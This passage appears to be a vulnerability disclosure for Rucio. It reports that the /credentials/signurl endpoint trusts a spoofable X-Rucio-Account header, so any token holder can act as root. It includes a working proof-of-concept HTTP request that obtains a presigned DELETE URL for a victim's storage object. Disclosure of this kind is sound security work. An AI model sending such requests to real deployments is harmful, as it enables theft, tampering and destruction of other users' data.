    return _is_root(issuer)        # _is_root(x) -> x.external == 'root'
```

`InternalAccount('root', vo).external == 'root'` unconditionally, so the gate passes whenever the header is `root`. The endpoint is on `AuthenticatedBlueprint`, whose `before_request` hook validates the token and sets `request.environ['issuer']` **from the token** — but nothing ever compares `X-Rucio-Account` to it:

```python
# lib/rucio/web/rest/flaskapi/v1/common.py  (request_auth_env)
flask.request.environ['issuer'] = auth.get('account')             # L168  (the real account; unused by SignURL)
```

This is anomalous: every other authenticated handler derives the account from `request.environ['issuer']`; `credentials.py` is the only one that trusts the header. Additionally, `core.credential.get_signed_url` never checks that the supplied `url`'s host/bucket belongs to the target RSE, so even a legitimate `root` caller gets an arbitrary-object signing oracle. In multi-VO the VO is also read from the `X-Rucio-VO` header, allowing cross-tenant targeting.

## Proof of concept
Request (any valid token + spoofed account):
```
GET /credentials/signurl?rse=<cloudRSE>&svc=s3&op=delete&url=https://victim-bucket.s3.amazonaws.com/important/dataset.root HTTP/1.1
X-Rucio-Auth-Token: <any valid token, even a low-privilege account>
X-Rucio-Account: root
Accept: application/octet-stream
```
Response: `200 OK` with a presigned DELETE URL the attacker replays directly against the storage backend.

## Impact
A low-privilege Rucio user can read, overwrite, and delete arbitrary objects on any cloud-backed (S3/GCS/Swift) RSE using the server's stored credentials — enabling data exfiltration, tampering, and destruction, and cross-tenant access in multi-VO deployments.

## Credit
Reported by seankohjs. Found via static analysis + manual verification.
